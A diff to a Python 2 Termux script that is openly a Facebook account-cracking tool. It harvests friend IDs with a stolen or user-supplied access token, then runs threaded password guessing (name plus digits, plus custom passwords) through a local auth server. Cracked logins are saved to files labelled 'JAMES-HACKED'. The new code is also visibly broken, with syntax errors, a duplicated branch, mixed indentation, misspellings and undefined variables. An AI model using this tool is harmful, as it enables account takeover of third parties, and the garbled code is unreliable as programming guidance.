@@ -20,11 +20,11 @@ try:
     my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
 except requests.exceptions.ConnectionError:
     os.system('git pull')
-if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+if not os.path.isfile("/data/data/com.termux/files/home/...../public/node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
     time.sleep(10)
-elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+elif os.path.isfile("/data/data/com.termux/files/home/public/node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
     os.system("cd ..... && node index.js &")
@@ -130,7 +130,7 @@ def methodlogin():
 		logo()
 		hosp = raw_input("[+] Give Token : ")
 		tik()
-		hopa = open('login.txt','w')
+		hopa = open('access_token.txt', 'w')
 		hopa.write(hosp)
 		hopa.close()
 		print "\n[✓] Logged In Successfully."
@@ -145,7 +145,7 @@ def methodlogin():
 def login():
 	os.system("clear")
 	try:
-		tb=open('login.txt', 'r')
+		tb=open('access_token.txt', 'w')
 		os.system("python2 .hop2.py")
 	except (KeyError,IOError):
 		os.system("clear")
@@ -182,7 +182,7 @@ def login():
 def menu():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token = open('access_token.txt', 'r').read()
 	except IOError:
 		os.system('clear')
 		print"\x1b[1;31mToken invalid"
@@ -190,14 +190,13 @@ def menu():
 		time.sleep(1)
 		methodlogin()
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
 	except KeyError:
 		os.system('clear')
 		print"\033[1;31mYour Account is on Checkpoint"
-		os.system('rm -rf login.txt')
 		time.sleep(1)
 		methodlogin()
 	except requests.exceptions.ConnectionError:
@@ -240,10 +239,9 @@ def super():
 	global toket
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('access_token.txt', 'r').read()
 	except IOError:
 		print"\x1b[1;97mToken invalid"
-		os.system('rm -rf login.txt')
 		time.sleep(1)
 		methodlogin()
 	os.system('clear')
@@ -255,42 +253,71 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
-	if peak =="":
-		print "\x1b[1;97mFill in correctly"
-		pilih_super()
+    id = []
+    cps = []
+    oks = []
+    peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
+    if peak =="":
+            print "\x1b[1;97mFill in correctly"
+            pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		logo()
 		print "\033[1;97m Please Wait"
 		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+ token)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		logo()
-		idt = raw_input("\033[1;97m≻\033[1;97mLink ID\033[1;37m: \033[1;97m")
+	elif peak =="2"
+                if peak =="2":
+                os.system('clear')
+                print logo
+                print '\033[1;31;1m~~~~ public cracking ~~~~'
+                print ''
+                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
+                print ''
+                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                pass4 = raw_input(' \033[1;92m[4]Password: ')
+		pass5 = raw_input(' \033[1;92m[5]Password: ')
+                pass6 = raw_input(' \033[1;92m[6]Password: ')
+                pass7 = raw_input(' \033[1;92m[7]Password: ')
+                pass8 = raw_input(' \033[1;92m[8]Password: ')
+                idt = raw_input(' \033[1;93m[★]Enter id: ')
 		
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
-		except KeyError:
-			print"\x1b[1;97mID Not Found!"
-			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
-			super()
+	try:
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+ token)
+		op = json.loads(jok.text)
+		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
+	except KeyError:
+		print"\x1b[1;97mID Not Found!"
+		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
+		super()
 		print"\033[1;97m[✔] Getting IDs..."
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+ token)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
 			
 	elif peak =="3":
 		
-            os.system('clear')
-	    logo()
+                if peak =="2":
+                os.system('clear')
+                print logo
+                print '\033[1;31;1m~~~~ File cracking ~~~~'
+                print ''
+                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
+                print ''
+                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                pass4 = raw_input(' \033[1;92m[4]Password: ')
+		pass5 = raw_input(' \033[1;92m[5]Password: ')
+                pass6 = raw_input(' \033[1;92m[6]Password: ')
+                pass7 = raw_input(' \033[1;92m[7]Password: ')
+                pass8 = raw_input(' \033[1;92m[8]Password: ')
 	    try:
 	        idlist= raw_input('[+] File Name: ')
 	        for line in open(idlist ,'r').readlines():
@@ -318,140 +345,142 @@ print ('[!] To Stop Process Press CTRL Then Z')
 		global cekpoint,oks
 		user = arg
                 (uid, name) = user.split('|')
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass #Dev:Jam
-		try:
-			a = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+toket)
-			b = json.loads(a.text)
-			pass1 = '223344'
-			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-			q = json.load(data)
-			if 'access_token' in q:
-				x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-				z = json.loads(x.text)
-				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
-				oks.append(uid+pass1)
-			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(uid+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(uid+pass1)
-				else:
-					pass2 = '334455'
-					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-					q = json.load(data)
-					if 'access_token' in q:
-						x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-						z = json.loads(x.text)
-						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass2	
-						oks.append(uid+pass2)
-					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
-							cek = open("out/checkpoint.txt", "a")
-							cek.write(uid+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(uid+pass2)
-						else:
-							pass3 = '445566'
-							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-							q = json.load(data)
-							if 'access_token' in q:
-								x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-								z = json.loads(x.text)
-								print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass3	
-								oks.append(uid+pass3)
-							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
-									cek = open("out/checkpoint.txt", "a")
-									cek.write(uid+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(uid+pass3)
-								else:
-									pass4 = '556677'
-									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-									q = json.load(data)
-									if 'access_token' in q:
-										x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-										z = json.loads(x.text)
-										print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass4	
-										oks.append(uid+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
-											cek = open("out/Checkpoint.txt", "a")
-											cek.write(uid+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(uid+pass4)
-										else:
-											pass5 = '667788'
-											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-											q = json.load(data)
-											if 'access_token' in q:
-												x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-												z = json.loads(x.text)
-												print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass5	
-												oks.append(uid+pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
-													cek = open("out/checkpoint.txt", "a")
-													cek.write(uid+"|"+pass5+"\n")
-													cek.close()
-													cekpoint.append(uid+pass5)
-												else:
-													pass6 = '778899'
-													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-													q = json.load(data)
-													if 'access_token' in q:
-														x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-														z = json.loads(x.text)
-														print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass6	
-														oks.append(uid+pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
-															cek = open("out/checkpoint.txt", "a")
-															cek.write(uid+"|"+pass6+"\n")
-															cek.close()
-															cekpoint.append(uid+pass6)
-														else:
-															pass7 = '889900'
-															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
-															q = json.load(data)
-															if 'access_token' in q:
-																x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
-																z = json.loads(x.text)
-																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass7	
-																oks.append(uid+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
-																	cek = open("out/checkpoint.txt", "a")
-                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(uid+pass7)
-															
-		except:
-			pass
+                try:
+                   pass1 = name.lower() + p1
+                   data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                   q = json.loads(data)
+                   if 'loc' in q:
+                       print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                       ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                       ok.write(uid + ' | ' + pass1 + '\n')
+                       ok.close()
+                       oks.append(uid + pass1)
+                   elif 'www.facebook.com' in q['error']:
+                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
+                       cp = open('HOP_CP.txt', 'a')
+                       cp.write(uid + ' | ' + pass1 + '\n')
+                       cp.close()
+                       cps.append(uid + pass1)
+                   else:
+                       pass2 = name.lower() + p2
+                       data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+                       q = json.loads(data)
+                       if 'loc' in q:
+                           print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                           ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                           ok.write(uid + ' | ' + pass2 + '\n')
+                           ok.close()
+                           oks.append(uid + pass2)
+                       elif 'www.facebook.com' in q['error']:
+                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
+                           cp = open('HOP_CP.txt', 'a')
+                           cp.write(uid + ' | ' + pass2 + '\n')
+                           cp.close()
+                           cps.append(uid + pass2)
+                       else:
+                           pass3 = name.lower() + p3
+                           data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                           q = json.loads(data)
+                           if 'loc' in q:
+                               print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                               ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                               ok.write(uid + ' | ' + pass3 + '\n')
+                               ok.close()
+                               oks.append(uid + pass3)
+                           elif 'www.facebook.com' in q['error']:
+                               print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
+                               cp = open('HOP_CP.txt', 'a')
+                               cp.write(uid + ' | ' + pass3 + '\n')
+                               cp.close()
+                               cps.append(uid + pass3)
+                           else:
+                               data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
+                               q = json.loads(data)
+                               if 'loc' in q:
+                                   print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                                   ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                   ok.write(uid + ' | ' + pass4 + '\n')
+                                   ok.close()
+                                   oks.append(uid + pass4)
+                               elif 'www.facebook.com' in q['error']:
+                                   print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
+                                   cp = open('HOP_CP.txt', 'a')
+                                   cp.write(uid + ' | ' + pass4 + '\n')
+                                   cp.close()
+                                   cps.apppend(uid + pass4)
+			       else:
+				   data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
+                                   q = json.loads(data)
+                                   if 'loc' in q:
+                                       print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                       ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                       ok.write(uid + ' | ' + pass5 + '\n')
+                                       ok.close()
+                                       oks.append(uid + pass5)
+                                   elif 'www.facebook.com' in q['error']:
+                                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
+                                       cp = open('HOP_CP.txt', 'a')
+                                       cp.write(uid + ' | ' + pass5 + '\n')
+                                       cp.close()
+                                       cps.append(uid + pass5)
+                                   else:
+                                       data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
+                                       q = json.loads(data)
+                                       if 'loc' in q:
+                                           print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                           ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                           ok.write(uid + ' | ' + pass6 + '\n')
+                                           ok.close()
+                                           oks.append(uid + pass6)
+                                       elif 'www.facebook.com' in q['error']:
+                                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
+                                           cp = open('HOP_CP.txt', 'a')
+                                           cp.write(uid + ' | ' + pass6 + '\n')
+                                           cp.close()
+                                           cps.append(uid + pass6)
+                                       else:
+                                           data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
+                                           q = json.loads(data)
+                                           if 'loc' in q:
+                                               print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                               ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                               ok.write(uid + ' | ' + pass7 + '\n')
+                                               ok.close()
+                                               oks.append(uid + pass7)
+                                           elif 'www.facebook.com' in q['error']:
+                                               print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass7
+                                               cp = open('HOP_CP.txt', 'a')
+                                               cp.write(uid + ' | ' + pass7 + '\n')
+                                               cp.close()
+                                               cps.append(uid + pass7)
+                                           else:
+                                               data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
+                                               q = json.loads(data)
+                                               if 'loc' in q:
+                                                   print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                                   ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                                   ok.write(uid + ' | ' + pass8 + '\n')
+                                                   ok.close()
+                                                   oks.append(uid + pass8)
+                                               elif 'www.facebook.com' in q['error']:
+                                                   print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass8
+                                                   cp = open('HOP_CP.txt', 'a')
+                                                   cp.write(uid + ' | ' + pass8 + '\n')
+                                                   cp.close()
+                                                   cps.apppend(uid + pass8)
+        except:
+            pass
 		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;97m---------------------------------------------------"
+    p = ThreadPool(30)
+    p.map(main, id)
+    print ''
+    print ' \033[1;92mCrack Done'
+    print '\033[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ''
+    print 47 * '-'
+    raw_input('\033[1;93m Press enter to back')
+    menu()
 	
-	print '\033[1;97mProcess Has Been Completed.'
-	print"\033[1;97m-----------------"
-	print"\033[1;97mTotal OK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m---------------------------------------------------"
-	
-	
-	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
-	menu()
 
 if __name__ == '__main__':
     methodlogin()
